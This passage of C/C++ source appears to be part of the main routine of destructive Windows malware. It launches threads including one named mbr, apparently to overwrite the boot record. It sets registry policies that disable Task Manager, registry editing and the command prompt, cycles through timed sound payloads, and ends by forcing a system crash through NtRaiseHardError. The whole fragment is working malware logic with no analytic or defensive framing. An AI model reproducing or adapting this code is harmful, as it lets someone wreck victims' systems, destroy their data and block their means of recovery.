			CreateThread(0, 0, mbr, 0, 0, 0);
			CreateThread(0, 0, taskbar, 0, 0, 0);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
			Sleep(5000);
			CreateThread(0, 0, textz, 0, 0, 0);
			CreateThread(0, 0, resize, 0, 0, 0);
			CreateThread(0, 0, opener, 0, 0, 0);
			CreateThread(0, 0, payload, 0, 0, 0);
			sound1();
			Sleep(30100);
			sound2();
			Sleep(30100);
			sound3();
			Sleep(30100);
			sound4();
			Sleep(30100);
			sound5();
			Sleep(30100);
			sound6();
			Sleep(30100);
			sound7();
			Sleep(30100);
			sound8();
			Sleep(30100);
			sound9();
			Sleep(30100);
			sound10();
			Sleep(30100);
			sound11();
			Sleep(30100);
			sound12();
			Sleep(30100);
			sound13();
			Sleep(30100);
			sound14();
			Sleep(30100);
			sound15();
			Sleep(30100);
			sound16();
			Sleep(30100);
			sound17();
			Sleep(30100);
			sound18();
			Sleep(30100);
			sound19();
			Sleep(30100);
			sound20();
			Sleep(30100);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}